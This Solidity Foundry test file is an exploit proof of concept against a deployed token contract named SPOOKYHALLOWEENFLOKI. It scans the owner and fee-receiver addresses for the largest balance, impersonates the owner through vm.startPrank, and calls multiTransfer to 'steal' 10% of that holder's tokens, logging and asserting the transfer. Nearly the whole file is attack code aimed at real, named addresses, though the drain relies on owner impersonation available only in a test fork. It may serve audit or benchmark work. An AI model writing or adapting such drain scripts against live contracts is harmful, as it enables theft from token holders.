import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Interface for the token contract
interface SPOOKYHALLOWEENFLOKI {
    function getOwner() external view returns (address);
    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external;
    function balanceOf(address account) external view returns (uint256);
}

// BEP20 interface is already available in the test template
interface BEP20 {
    function balanceOf(address account) external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address victim;
    uint256 initialAttackerBalance;
    uint256 initialVictimBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing contract at TARGET
        // We need to identify a victim with token balance
        victim = 0xc0a641F1F6ed23384bf8dD3A5425aFcbE9A9f7dF; // Using teamFeeReceiver as victim (has tokens from fees)

        // Get initial balances for verification
        initialAttackerBalance = BEP20(TARGET).balanceOf(attacker);
        initialVictimBalance = BEP20(TARGET).balanceOf(victim);

        // Ensure victim has tokens
        require(initialVictimBalance > 0, "Victim has no tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the contract owner address
        address contractOwner = SPOOKYHALLOWEENFLOKI(TARGET).getOwner();
        console.log("Contract owner:", contractOwner);

        // Check multiple potential victims
        address[] memory potentialVictims = new address[](5);
        potentialVictims[0] = contractOwner;
        potentialVictims[1] = 0xc9550CF5389697c28d04e9A6ed3F0eF2838d749c; // marketingFeeReceiver
        potentialVictims[2] = 0x42c3EAfA224fc784Ecb34985d4D2D4B830C8203D; // developmentFeeReceiver
        potentialVictims[3] = 0xc0a641F1F6ed23384bf8dD3A5425aFcbE9A9f7dF; // teamFeeReceiver
        potentialVictims[4] = 0x335C1f7bf7d2d3178BF751c51EdA97423732F42A; // buybackFeeReceiver

        address victim = address(0);
        uint256 maxBalance = 0;

        for (uint i = 0; i < potentialVictims.length; i++) {
            uint256 balance = BEP20(TARGET).balanceOf(potentialVictims[i]);
            console.log("Balance of", potentialVictims[i], ":", balance);
            if (balance > maxBalance) {
                victim = potentialVictims[i];
                maxBalance = balance;
            }
        }

        require(victim != address(0) && maxBalance > 0, "No victim with token balance found");
        console.log("Selected victim:", victim, "with balance:", maxBalance);

        // Get initial balances
        uint256 initialAttackerBalance = BEP20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialAttackerBalance);

        // Impersonate owner
        vm.startPrank(contractOwner);

        // Prepare multiTransfer parameters
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;

        uint256[] memory amounts = new uint256[](1);
        uint256 stealAmount = maxBalance / 10; // Steal 10%
        if (stealAmount == 0) {
            stealAmount = 1 * 10**9; // Minimum 1 token (9 decimals)
        }
        if (stealAmount > maxBalance) {
            stealAmount = maxBalance;
        }
        amounts[0] = stealAmount;

        console.log("Stealing", stealAmount, "tokens from", victim);

        // Execute exploit
        SPOOKYHALLOWEENFLOKI(TARGET).multiTransfer(victim, recipients, amounts);

        vm.stopPrank();

        // Verify results
        uint256 finalAttackerBalance = BEP20(TARGET).balanceOf(attacker);
        uint256 finalVictimBalance = BEP20(TARGET).balanceOf(victim);

        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final victim balance:", finalVictimBalance);
        console.log("Tokens stolen:", finalAttackerBalance - initialAttackerBalance);

        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance must increase");
        assertApproxEqAbs(finalAttackerBalance - initialAttackerBalance, stealAmount, 1, "Stolen amount should match");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

